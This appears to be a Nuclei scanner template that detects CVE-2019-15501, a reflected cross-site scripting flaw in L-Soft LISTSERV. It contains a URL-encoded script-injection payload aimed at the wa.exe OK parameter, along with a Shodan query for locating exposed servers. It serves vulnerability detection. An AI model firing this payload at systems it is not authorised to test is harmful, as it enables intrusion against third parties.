id: CVE-2019-15501

info:
  name: LSoft ListServ < 16.5-2018a - Cross-Site Scripting
  author: arafatansari
  severity: medium
  description: |
    Reflected cross site scripting (XSS) in L-Soft LISTSERV before 16.5-2018a exists via the /scripts/wa.exe OK parameter.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15501
    - https://packetstormsecurity.com/files/154202/LSoft-ListServ-Cross-Site-Scripting.html
    - https://www.exploit-db.com/exploits/47302
    - https://www.tenable.com/cve/CVE-2019-15501
  metadata:
    shodan-query: http.html:"LISTSERV"
    verified: "true"
  tags: cve,cve2019,xss,listserv

requests:
  - method: GET
    path:
      - "{{BaseURL}}/scripts/wa.exe?OK=%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(document.domain)</script>"
          - "LISTSERV"
        condition: and

      - type: status
        status:
          - 200
